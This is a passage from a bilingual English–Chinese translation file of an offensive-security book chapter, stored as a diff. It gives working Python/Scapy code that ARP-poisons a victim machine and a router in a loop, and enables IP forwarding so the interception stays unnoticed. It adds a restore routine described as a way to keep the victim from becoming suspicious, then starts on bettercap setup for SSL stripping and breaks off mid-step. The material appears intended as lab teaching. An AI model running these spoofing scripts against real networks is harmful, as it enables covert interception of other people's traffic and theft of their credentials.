+  id: totrans-109
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response = ARP()
+- en: arp_response.op = 2
+  id: totrans-110
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.op = 2
+- en: arp_response.pdst = "192.168.74.129"
+  id: totrans-111
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.pdst = "192.168.74.129"
+- en: arp_response.hwdst = "00:0C:29:BE:47:14"
+  id: totrans-112
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.hwdst = "00:0C:29:BE:47:14"
+- en: arp_response.hwsrc = "00:0c:29:90:79:02"
+  id: totrans-113
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.hwsrc = "00:0c:29:90:79:02"
+- en: arp_response.psrc = "192.168.74.2"
+  id: totrans-114
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.psrc = "192.168.74.2"
+- en: send(arp_response)
+  id: totrans-115
+  prefs: []
+  type: TYPE_NORMAL
+  zh: send(arp_response)
+- en: 'def spoof_router():'
+  id: totrans-116
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 'def 欺骗路由器():'
+- en: arp_response = ARP()
+  id: totrans-117
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response = ARP()
+- en: arp_response.op = 2
+  id: totrans-118
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.op = 2
+- en: arp_response.pdst = "192.168.74.2"
+  id: totrans-119
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.pdst = "192.168.74.2"
+- en: arp_response.hwdst = "00:50:56:ff:74:8b"
+  id: totrans-120
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.hwdst = "00:50:56:ff:74:8b"
+- en: arp_response.hwsrc = "00:0c:29:90:79:02"
+  id: totrans-121
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.hwsrc = "00:0c:29:90:79:02"
+- en: arp_response.psrc = "192.168.74.129"
+  id: totrans-122
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.psrc = "192.168.74.129"
+- en: send(arp_response)
+  id: totrans-123
+  prefs: []
+  type: TYPE_NORMAL
+  zh: send(arp_response)
+- en: 'if __name__ == "__main__":'
+  id: totrans-124
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 'if __name__ == "__main__":'
+- en: spoof_victim()
+  id: totrans-125
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 欺骗受害者()
+- en: spoof_router()
+  id: totrans-126
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 欺骗路由器()
+- en: Note that this will only spoof these devices once. To create a permanent spoofing,
+    we can add these function calls to a loop and continuously send these packets
+    after a certain delay. This way, the **arp** tables will not get a chance to reset
+    and you will be able to permanently spoof these devices, as long as your spoof
+    program is running.
+  id: totrans-127
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 注意，这只会欺骗这些设备一次。为了创建持久的欺骗，我们可以将这些函数调用添加到循环中，并在一定延迟后持续发送这些数据包。这样，**arp** 表将没有机会重置，你将能够永久欺骗这些设备，只要你的欺骗程序仍在运行。
+- en: 'We can also try to put an exit condition in a loop. We will use **KeyboardInterrupt**
+    to exit. Use the following code to send packets continuously after a delay of
+    every 2 seconds:'
+  id: totrans-128
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 我们也可以尝试在循环中设置退出条件。我们将使用 **KeyboardInterrupt** 来退出。使用以下代码在每 2 秒延迟后持续发送数据包：
+- en: 'try:'
+  id: totrans-129
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 'try:'
+- en: 'while True:'
+  id: totrans-130
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 'while True:'
+- en: spoof_victim()
+  id: totrans-131
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 欺骗受害者()
+- en: spoof_router()
+  id: totrans-132
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 欺骗路由器()
+- en: time.sleep(2)
+  id: totrans-133
+  prefs: []
+  type: TYPE_NORMAL
+  zh: time.sleep(2)
+- en: 'except KeyboardInterrupt as err:'
+  id: totrans-134
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 'except KeyboardInterrupt as err:'
+- en: print("exiting")
+  id: totrans-135
+  prefs: []
+  type: TYPE_NORMAL
+  zh: print("退出")
+- en: 'Note that you will need to import the time module at the top of file. Although
+    our spoofing program looks complete, there is a slight problem – if the victim
+    now tries to request an internet server, they will see an internet connectivity
+    issue. Run the **arp** spoof program on Linux and go to the Windows machine and
+    try to access a website. You will see a window similar to the following:'
+  id: totrans-136
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 注意，你需要在文件顶部导入 time 模块。尽管我们的欺骗程序看起来已经完成，但仍然有一个小问题——如果受害者现在尝试请求互联网服务器，他们将看到互联网连接问题。运行
+    **arp** 欺骗程序在 Linux 上，并去 Windows 机器尝试访问一个网站。你将看到一个类似于以下的窗口：
+- en: '![Figure 5.11 – No connection'
+  id: totrans-137
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.11 – 无连接'
+- en: '](image/B14788_05_11.jpg)'
+  id: totrans-138
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_11.jpg)'
+- en: Figure 5.11 – No connection
+  id: totrans-139
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.11 – 无连接
+- en: 'This is because the packets are going to the Kali machine but it is blocking
+    packets from being forwarded. To enable packet forwarding, run the following command
+    on your Linux Terminal:'
+  id: totrans-140
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 这是因为数据包正在发送到 Kali 机器，但它正在阻止数据包的转发。为了启用数据包转发，请在 Linux 终端中运行以下命令：
+- en: sysctl -w net.ipv4.ip_forward=1
+  id: totrans-141
+  prefs: []
+  type: TYPE_NORMAL
+  zh: sysctl -w net.ipv4.ip_forward=1
+- en: 'This will enable IP forwarding on the Kali machine. Now, the Windows user will
+    be able to access the internet without even noticing that someone is intercepting
+    their traffic:'
+  id: totrans-142
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 这将在 Kali 机器上启用 IP 转发。现在，Windows 用户将能够访问互联网，而不会察觉到有人正在拦截他们的流量：
+- en: '![Figure 5.12 – Enabling IPv4 forwarding'
+  id: totrans-143
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.12 – 启用 IPv4 转发'
+- en: '](image/B14788_05_12.jpg)'
+  id: totrans-144
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_12.jpg)'
+- en: Figure 5.12 – Enabling IPv4 forwarding
+  id: totrans-145
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.12 – 启用 IPv4 转发
+- en: Now, if you go to the Windows machine and try to access a website again, you
+    should have internet connectivity. Now, your spoof program should be working perfectly.
+  id: totrans-146
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 现在，如果你去 Windows 机器并再次尝试访问一个网站，你应该能够连接到互联网。现在，你的欺骗程序应该完美运行。
+- en: Monitoring traffic
+  id: totrans-147
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+  zh: 监控流量
+- en: 'To see what the user is doing, you can open *Wireshark* on Kali and select
+    the **eth0** interface to see all the traffic going over the network. To see only
+    the traffic originating from the Windows machine, you can set a filter in the
+    filter menu. Use the following filter:'
+  id: totrans-148
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 要查看用户正在做什么，可以在 Kali 上打开*Wireshark*，并选择**eth0**接口来查看所有经过网络的流量。要仅查看来自 Windows
+    机器的流量，可以在过滤器菜单中设置过滤器。使用以下过滤器：
+- en: ip.src == 192.168.74.129
+  id: totrans-149
+  prefs: []
+  type: TYPE_NORMAL
+  zh: ip.src == 192.168.74.129
+- en: 'This will only display the traffic that originates from the Windows machine.
+    Now, if you were to go to the Windows machine and access a website, you should
+    see the packet arriving in Wireshark:'
+  id: totrans-150
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 这将仅显示来自 Windows 机器的流量。现在，如果你去 Windows 机器并访问一个网站，你应该会在 Wireshark 中看到数据包到达：
+- en: '![Figure 5.13 – Wireshark traffic from a Windows machine'
+  id: totrans-151
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.13 – 来自 Windows 机器的 Wireshark 流量'
+- en: '](image/B14788_05_13.jpg)'
+  id: totrans-152
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_13.jpg)'
+- en: Figure 5.13 – Wireshark traffic from a Windows machine
+  id: totrans-153
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.13 – 来自 Windows 机器的 Wireshark 流量
+- en: In this section, we learned how to poison an ARP table and monitor the network
+    traffic between the victim device and the internet. In the next section, we will
+    learn how this network traffic is encrypted and how this encryption can be broken.
+  id: totrans-154
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在本节中，我们学习了如何毒化 ARP 表并监视受害设备与互联网之间的网络流量。在下一节中，我们将学习这些网络流量是如何加密的，以及如何破解这种加密。
+- en: Encrypted traffic
+  id: totrans-155
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+  zh: 加密流量
+- en: In the early days of the internet, internet traffic was mostly text-based, so
+    everyone sniffing over the network could see exactly what was being sent over
+    it. This was extremely unsecure and people could not send sensitive information
+    such as passwords over the network. Since then, the internet has come a long way.
+    Now, most internet traffic, except for some really old websites, is secure and
+    uses encryption. This means that even if you can see the traffic, you will not
+    be able to read it since it is encrypted. If you see the **https** tag on a website's
+    URL, this means that the network traffic is encrypted and can't be read over the
+    wire. There are tools that can be used to decrypt this traffic.
+  id: totrans-156
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在互联网早期，网络流量主要是基于文本的，因此所有嗅探网络的人都能准确地看到传输的数据内容。这是极不安全的，且人们无法通过网络发送敏感信息，例如密码。从那时起，互联网发展迅速。现在，除了一些非常旧的网站外，大多数互联网流量都是安全的，并使用加密技术。这意味着即使你能看到流量，也无法读取它，因为它是加密的。如果你看到一个网站
+    URL 上有**https**标签，表示该网络流量是加密的，不能通过网络读取。有一些工具可以用来解密这种流量。
+- en: Restoring ARP tables manually
+  id: totrans-157
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+  zh: 手动恢复 ARP 表
+- en: 'Now that we have seen how to successfully spoof packets, when we close our
+    program by using a keyboard interrupt, such as *Ctrl* + *C*, we will see that
+    the internet becomes unavailable again on our Windows machine. This is because
+    the ARP tables have been poisoned and we haven''t restored them, so they don''t
+    know where to route the network traffic. This will automatically reset itself
+    after a couple of minutes. However, this can raise suspicion for the victim, and
+    they might realize that someone is tampering with their network traffic. To avoid
+    this, we can restore these tables by sending over correct information when we
+    exit the program. We can use the following program to restore the correct values:'
+  id: totrans-158
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 现在我们已经看到如何成功伪造数据包，当我们使用键盘中断（如*Ctrl* + *C*）关闭程序时，我们会发现 Windows 机器上的互联网再次变得不可用。这是因为
+    ARP 表已经被毒化，而且我们没有恢复它们，所以它们不知道如何路由网络流量。几分钟后，这一情况会自动恢复。然而，这可能引起受害者的怀疑，他们可能意识到有人在篡改他们的网络流量。为避免这种情况，我们可以在退出程序时通过发送正确的信息来恢复这些表。我们可以使用以下程序来恢复正确的值：
+- en: 'def restore():'
+  id: totrans-159
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 'def restore():'
+- en: '# restoring router table'
+  id: totrans-160
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '# 恢复路由器表'
+- en: arp_response = ARP()
+  id: totrans-161
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response = ARP()
+- en: arp_response.op = 2
+  id: totrans-162
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.op = 2
+- en: arp_response.pdst = "192.168.74.2"
+  id: totrans-163
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.pdst = "192.168.74.2"
+- en: arp_response.hwdst = "00:50:56:ff:74:8b"
+  id: totrans-164
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.hwdst = "00:50:56:ff:74:8b"
+- en: arp_response.hwsrc = "00:0C:29:BE:47:14"
+  id: totrans-165
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.hwsrc = "00:0C:29:BE:47:14"
+- en: arp_response.psrc = "192.168.74.129"
+  id: totrans-166
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.psrc = "192.168.74.129"
+- en: send(arp_response)
+  id: totrans-167
+  prefs: []
+  type: TYPE_NORMAL
+  zh: send(arp_response)
+- en: '#restoring windows table'
+  id: totrans-168
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '# 恢复 Windows 表'
+- en: arp_response = ARP()
+  id: totrans-169
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response = ARP()
+- en: arp_response.op = 2
+  id: totrans-170
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.op = 2
+- en: arp_response.pdst = "192.168.74.129"
+  id: totrans-171
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.pdst = "192.168.74.129"
+- en: arp_response.hwdst = "00:0C:29:BE:47:14"
+  id: totrans-172
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.hwdst = "00:0C:29:BE:47:14"
+- en: arp_response.hwsrc = "00:50:56:ff:74:8b"
+  id: totrans-173
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.hwsrc = "00:50:56:ff:74:8b"
+- en: arp_response.psrc = "192.168.74.2"
+  id: totrans-174
+  prefs: []
+  type: TYPE_NORMAL
+  zh: arp_response.psrc = "192.168.74.2"
+- en: send(arp_response)
+  id: totrans-175
+  prefs: []
+  type: TYPE_NORMAL
+  zh: send(arp_response)
+- en: 'Note that these values are for my platform; they will be different for your
+    platform, so you should change these values accordingly. To restore the ARP table,
+    send these values to the router from our Linux machine while pretending to be
+    device A. This time, instead of entering fake information, enter the correct values.
+    Do the same for the Windows machine. Finally, call this function when a keyboard
+    interrupt occurs, as shown here:'
+  id: totrans-176
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 请注意，这些值适用于我的平台；它们会根据你的平台有所不同，因此你应该相应地更改这些值。为了恢复 ARP 表，从我们的 Linux 机器向路由器发送这些值，同时伪装成设备
+    A。这一次，输入正确的值，而不是虚假的信息。对于 Windows 机器，也做同样的操作。最后，当发生键盘中断时，调用此函数，如下所示：
+- en: 'try:'
+  id: totrans-177
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 'try:'
+- en: 'while True:'
+  id: totrans-178
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 'while True:'
+- en: spoof_victim()
+  id: totrans-179
+  prefs: []
+  type: TYPE_NORMAL
+  zh: spoof_victim()
+- en: spoof_router()
+  id: totrans-180
+  prefs: []
+  type: TYPE_NORMAL
+  zh: spoof_router()
+- en: time.sleep(2)
+  id: totrans-181
+  prefs: []
+  type: TYPE_NORMAL
+  zh: time.sleep(2)
+- en: 'except KeyboardInterrupt as err:'
+  id: totrans-182
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 'except KeyboardInterrupt as err:'
+- en: print("restoring ARP tables")
+  id: totrans-183
+  prefs: []
+  type: TYPE_NORMAL
+  zh: print("正在恢复 ARP 表")
+- en: restore()
+  id: totrans-184
+  prefs: []
+  type: TYPE_NORMAL
+  zh: restore()
+- en: print("exiting")
+  id: totrans-185
+  prefs: []
+  type: TYPE_NORMAL
+  zh: print("退出")
+- en: In this section, we learned how to poison an ARP table, monitor the network
+    traffic, and restore the ARP tables in the victim machines to make sure they're
+    not suspicious of our activity. Next, we will learn how to decrypt this network
+    traffic.
+  id: totrans-186
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在本节中，我们学习了如何毒化 ARP 表，监控网络流量，并恢复受害机器中的 ARP 表，以确保它们不会怀疑我们的活动。接下来，我们将学习如何解密这些网络流量。
+- en: Decrypting the network traffic
+  id: totrans-187
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+  zh: 解密网络流量
+- en: As we saw in the previous section, we can intercept traffic using a man in the
+    middle attack. However, this attack is rarely useful on its own since all the
+    browser traffic nowadays is encrypted, so even if you were able to intercept traffic,
+    you won't be able to do much. You can bypass this procedure by using SSL stripping.
+    Intercepting traffic without encryption is also sometimes useful when you want
+    to monitor a user's activity. This can help you figure out which websites a user
+    is visiting the most. Using this information alongside social engineering attacks
+    can help you compromise the victim's machine.
+  id: totrans-188
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 正如我们在前一节所看到的，我们可以通过中间人攻击来拦截流量。然而，这种攻击通常独立使用时效果有限，因为现在几乎所有的浏览器流量都是加密的，因此即使你能够拦截流量，也无法做太多事情。你可以通过使用
+    SSL 去除攻击来绕过这个过程。在没有加密的情况下拦截流量，有时在你想监控用户活动时也很有用。这可以帮助你了解用户访问哪些网站最频繁。将这些信息与社会工程攻击结合使用，可以帮助你攻破受害者的机器。
+- en: HTTPS versus HTTP
+  id: totrans-189
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+  zh: HTTPS 与 HTTP
+- en: To understand how SSL stripping works, we need to understand how the **hypertext
+    transfer protocol** (**HTTP**) and HTTPS protocols work. HTTPS is a *secure* version
+    of HTTP, as indicated by the *S* at the end of its name. It was developed in the
+    early days of the internet, when information was sent in the form of human readable
+    text and anyone intercepting or monitoring the traffic could potentially see what
+    was going on.
+  id: totrans-190
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 要理解 SSL 去除攻击如何工作，我们需要了解 **超文本传输协议** (**HTTP**) 和 HTTPS 协议的工作原理。HTTPS 是 HTTP
+    的 *安全* 版本，正如其名称结尾的 *S* 所示。它是在互联网初期开发的，当时信息以人类可读的文本形式发送，任何拦截或监控流量的人都可能看到正在发生的事情。
+- en: 'A typical **HTTP** request would look something like this:'
+  id: totrans-191
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 一个典型的 **HTTP** 请求大概长这样：
+- en: '![Figure 5.14 – HTTP request'
+  id: totrans-192
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.14 – HTTP 请求'
+- en: '](image/B14788_05_14.jpg)'
+  id: totrans-193
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_14.jpg)'
+- en: Figure 5.14 – HTTP request
+  id: totrans-194
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.14 – HTTP 请求
+- en: 'As you can see, the body of the HTTP request is in the form of plain text,
+    which means it can be read easily. So, if you were to send your email or password
+    in plain text to the server, the hacker could potentially steal your credentials.
+    You already know how dangerous this can be. To avoid this problem, HTTPS was developed,
+    which could encrypt the body of the message so that only the server and requestor
+    can read it with the proper encryption keys – no middle man can read it. Once
+    the server receives the request, it will respond with the appropriate reply. The
+    server''s reply would look like this:'
+  id: totrans-195
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 如你所见，HTTP 请求的正文是纯文本形式，这意味着它可以轻松读取。因此，如果你以纯文本的形式将电子邮件或密码发送给服务器，黑客可能会窃取你的凭证。你已经知道这有多危险。为了解决这个问题，开发了
+    HTTPS，它可以加密消息的正文，确保只有服务器和请求者可以用正确的加密密钥读取，任何中间人都无法读取。当服务器收到请求后，它将回应适当的回复。服务器的回复大致如下：
+- en: '![Figure 5.15 – HTTP reply'
+  id: totrans-196
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.15 – HTTP 回复'
+- en: '](image/B14788_05_15.jpg)'
+  id: totrans-197
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_15.jpg)'
+- en: Figure 5.15 – HTTP reply
+  id: totrans-198
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.15 – HTTP 回复
+- en: The last line represents the body of the reply, which is the web page that the
+    user requested. In the case of HTTPS, the *body* of these requests and responses
+    would be encrypted and appear as gibberish to the attacker. Now, let's focus on
+    how we can bypass this.
+  id: totrans-199
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 最后一行代表回复的主体，即用户请求的网页。在 HTTPS 的情况下，这些请求和响应的*主体*会被加密，攻击者看到的内容将是乱码。现在，让我们关注如何绕过这一点。
+- en: Bypassing HTTPS
+  id: totrans-200
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+  zh: 绕过 HTTPS
+- en: 'Although the majority of websites nowadays support HTTPS instead of HTTP, on
+    the server side, in order to maintain backward compatibility, the server still
+    allows requests to come from *HTTP* and once they receive them, they will check
+    whether the client/requestor supports HTTPS or not. We can take advantage of this
+    to bypass this security mechanism. The following diagram shows how HTTP requests
+    work with a web server:'
+  id: totrans-201
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 尽管如今大多数网站都支持 HTTPS 而非 HTTP，但为了保持向后兼容性，服务器端仍然允许来自*HTTP*的请求，并在接收到这些请求后检查客户端/请求者是否支持
+    HTTPS。我们可以利用这一点绕过这一安全机制。下图展示了 HTTP 请求如何与 Web 服务器协作：
+- en: '![Figure 5.16 – HTTP cycle'
+  id: totrans-202
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.16 – HTTP 循环'
+- en: '](image/B14788_05_16.jpg)'
+  id: totrans-203
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_16.jpg)'
+- en: Figure 5.16 – HTTP cycle
+  id: totrans-204
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.16 – HTTP 循环
+- en: When the client first accesses a website, it is usually over HTTP protocol,
+    so it sends an unsecure request to initiate a connection. The server receives
+    this request and asks the client whether it supports HTTPS or not. If the client
+    supports HTTPS, the server will say, *Why don't you talk with me over HTTPS?*.
+    The client then switches to *HTTPS*. Once this happens, all the communication
+    is encrypted.
+  id: totrans-205
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 当客户端首次访问网站时，通常是通过 HTTP 协议，因此它会发送一个不安全的请求来启动连接。服务器接收到此请求后，会询问客户端是否支持 HTTPS。如果客户端支持
+    HTTPS，服务器会说，*为什么不通过 HTTPS 与我通信呢？* 客户端随后切换到 *HTTPS*。一旦发生这种情况，所有通信都会被加密。
+- en: 'This is where we will introduce our middle man *attacker*. We will do so in
+    a way to fool both the server and the client. Let''s take a look at the following
+    diagram:'
+  id: totrans-206
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在这里，我们将介绍我们的中间人*攻击者*。我们将通过一种方式来欺骗服务器和客户端。让我们看看以下示意图：
+- en: '![Figure 5.17 – MITM attack with SSL stripping'
+  id: totrans-207
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.17 – SSL 剥离的 MITM 攻击'
+- en: '](image/B14788_05_17.jpg)'
+  id: totrans-208
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_17.jpg)'
+- en: Figure 5.17 – MITM attack with SSL stripping
+  id: totrans-209
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.17 – SSL 剥离的 MITM 攻击
+- en: During the first phase, the client will make an HTTP request to the server.
+    The attacker is sitting between the client and the server and is using the **arp**
+    spoofing program to monitor the traffic that we developed in the previous chapter.
+    They will take this request from the client, convert it into an HTTPS request,
+    and forward it to the server. The server will think that the client is talking
+    over HTTPS instead of HTTP. Similarly, the attacker will take replies from the
+    server, decrypt them, and read what is happening. Once they've done that, they
+    will forward them to the victim/client. In this way, the victim will think that
+    the server is talking over HTTP, while the server will think that the client is
+    talking over HTTPS. Meanwhile, the attacker is reading all the network traffic.
+  id: totrans-210
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 在第一阶段，客户端将向服务器发出 HTTP 请求。攻击者坐在客户端和服务器之间，并使用**ARP**欺骗程序来监控我们在上一章中开发的流量。攻击者会将客户端的请求转换为
+    HTTPS 请求，并将其转发给服务器。服务器会认为客户端是通过 HTTPS 而不是 HTTP 与之通信。类似地，攻击者会从服务器获取回复，解密并读取发生的内容。一旦完成，他们会将其转发给受害者/客户端。通过这种方式，受害者会认为服务器是在通过
+    HTTP 通信，而服务器会认为客户端是在通过 HTTPS 通信。同时，攻击者可以读取所有的网络流量。
+- en: The job of the attacker is to encrypt and decrypt the SSL certificates that
+    are used by servers for authenticating security on the transport layer. They form
+    the basis of secure communication. Learning how to perform SSL stripping is outside
+    the scope of this book as it requires extensive knowledge of networking, which
+    could be a book on its own. Our goal here is to compromise the system using this
+    tool. We will use a famous SSL stripping tool called **bettercap** to do so. We
+    will use version 2.23\. Note that the latest tools for this component don't seem
+    to work properly. It can be found at [https://github.com/bettercap/bettercap/releases/download/v2.23/bettercap_linux_amd64_2.23.zip](https://github.com/bettercap/bettercap/releases/download/v2.23/bettercap_linux_amd64_2.23.zip).
+  id: totrans-211
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 攻击者的工作是加密和解密 SSL 证书，这些证书用于服务器在传输层上进行安全认证。它们构成了安全通信的基础。学习如何执行 SSL 剥离超出了本书的范围，因为它需要广泛的网络知识，这本身就可以成为一本书。我们的目标是在此使用该工具进行系统的破解。我们将使用一个著名的
+    SSL 剥离工具，叫做**bettercap**。我们将使用版本 2.23。请注意，最新的该组件工具似乎无法正常工作。可以从[https://github.com/bettercap/bettercap/releases/download/v2.23/bettercap_linux_amd64_2.23.zip](https://github.com/bettercap/bettercap/releases/download/v2.23/bettercap_linux_amd64_2.23.zip)下载。
+- en: Download this tool and run it on Linux.
+  id: totrans-212
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 下载此工具并在 Linux 上运行它。
+- en: Once you've downloaded it, put this zipped file in your desired location on
+    Kali Linux and extract the module. You will see an executable named **bettercap**.
+    You could directly run this executable and it would work just fine. However, I
+    recommend putting this in the **/usr/bin/** directory so that you can access it
+    from anywhere, so copy this file into **/usr/bin/**.
+  id: totrans-213
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 下载后，将这个压缩文件放在 Kali Linux 上的目标位置，并解压模块。你会看到一个名为**bettercap**的可执行文件。你可以直接运行这个可执行文件，它会正常工作。然而，我建议将其放在**/usr/bin/**目录下，这样你就可以在任何地方访问它，因此将这个文件复制到**/usr/bin/**目录。
+- en: 'To copy the file, use the following command:'
+  id: totrans-214
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 要复制文件，请使用以下命令：
+- en: sudo cp bettercap /usr/bin/bettercap
+  id: totrans-215
+  prefs: []
+  type: TYPE_NORMAL
+  zh: sudo cp bettercap /usr/bin/bettercap
+- en: 'Once copied, simply open a Terminal and type **bettercap** to run the file.
+    Before proceeding, we need to do a couple of things to start it. Write the following
+    command:'
+  id: totrans-216
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 一旦复制完成，只需打开终端并输入**bettercap**来运行该文件。在继续之前，我们需要做一些准备工作。输入以下命令：
+- en: sudo bettercap
+  id: totrans-217
+  prefs: []
+  type: TYPE_NORMAL
+  zh: sudo bettercap
+- en: 'The interface will look like this:'
+  id: totrans-218
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 界面将如下所示：
+- en: '![Figure 5.18 – bettercap version'
+  id: totrans-219
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.18 – bettercap 版本'
+- en: '](image/B14788_05_18.jpg)'
+  id: totrans-220
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_18.jpg)'
+- en: Figure 5.18 – bettercap version
+  id: totrans-221
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.18 – bettercap 版本
+- en: 'Next, you need to update a couple of things; that is, some internal files for
+    this module called caplets. Don''t worry – you don''t need to understand much
+    about caplets here. Just write the following commands and let the magic happen:'
+  id: totrans-222
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 接下来，你需要更新一些内容，即名为 caplets 的一些内部文件。别担心—你不需要了解太多关于 caplets 的内容。只需输入以下命令并让魔法发生：
+- en: caplets.update
+  id: totrans-223
+  prefs: []
+  type: TYPE_NORMAL
+  zh: caplets.update
+- en: This will download some files and update them.
+  id: totrans-224
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 这将下载一些文件并更新它们。
+- en: 'Exit this program to let the changes take place. Now, let''s run the program
+    again with the following command:'
+  id: totrans-225
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 退出这个程序以让更改生效。现在，让我们用以下命令再次运行程序：
+- en: sudo bettercap –-silent -iface eth0
+  id: totrans-226
+  prefs: []
+  type: TYPE_NORMAL
+  zh: sudo bettercap –-silent -iface eth0
+- en: 'This command will run **bettercap** in silent mode while using **eth0** as
+    its main network interface. To see which devices are available on the network,
+    you can type in the following command:'
+  id: totrans-227
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 该命令将在静默模式下运行**bettercap**，并使用**eth0**作为主要网络接口。要查看网络上有哪些设备，可以输入以下命令：
+- en: net.probe on
+  id: totrans-228
+  prefs: []
+  type: TYPE_NORMAL
+  zh: net.probe on
+- en: 'The output of this command will look something like this:'
+  id: totrans-229
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 该命令的输出将如下所示：
+- en: '![Figure 5.19 – Live hosts on the network'
+  id: totrans-230
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '![图 5.19 – 网络上的实时主机'
+- en: '](image/B14788_05_19.jpg)'
+  id: totrans-231
+  prefs: []
+  type: TYPE_NORMAL
+  zh: '](image/B14788_05_19.jpg)'
+- en: Figure 5.19 – Live hosts on the network
+  id: totrans-232
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 图 5.19 – 网络上的实时主机
+- en: 'Let''s try to use the internal **arpspoof** program for this application. Type
+    in the following command to set up **arp** spoofing for our Windows machine:'
+  id: totrans-233
+  prefs: []
+  type: TYPE_NORMAL
+  zh: 让我们尝试使用内部的**arpspoof**程序来进行这个应用。输入以下命令来设置我们 Windows 机器的**arp**欺骗：
